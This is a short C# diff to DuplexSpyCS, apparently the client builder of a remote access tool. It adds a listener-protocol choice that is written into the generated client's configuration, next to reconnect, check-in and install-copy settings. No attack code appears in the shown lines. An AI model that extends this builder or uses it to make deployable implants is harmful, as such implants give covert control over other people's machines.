@@ -309,6 +309,7 @@ namespace DuplexSpyCS
                 dwRetry = (int)numericUpDown3.Value, //Client reconnect time interval(ms).
                 dwInterval = (int)numericUpDown4.Value, //Send inform interval(ms).
                 szPrefix = textBox2.Text,
+                enProtocol = (enListenerProtocol)Enum.Parse(typeof(enListenerProtocol), comboBox3.Text),
 
                 //Install
                 bCopyDir = checkBox1.Checked,
@@ -361,6 +362,7 @@ namespace DuplexSpyCS
                     .Replace("[TIMEOUT]", buildConfig.dwTimeout.ToString()) //ms
                     .Replace("[RETRY]", buildConfig.dwRetry.ToString()) //ms
                     .Replace("[PREFIX]", buildConfig.szPrefix)
+                    .Replace("[PROTOCOL]", Enum.GetName(buildConfig.enProtocol))
 
                     //Install
                     .Replace("[IS_CP_DIR]", buildConfig.bCopyDir ? "true" : "false")
@@ -441,6 +443,12 @@ namespace DuplexSpyCS
 
         private void fnSetup()
         {
+            foreach (string s in Enum.GetNames(typeof(enListenerProtocol)))
+                comboBox3.Items.Add(s);
+
+            comboBox3.SelectedIndex = 0;
+            comboBox3.DropDownStyle = ComboBoxStyle.DropDownList;
+
             try
             {
                 if (ini_manager == null)
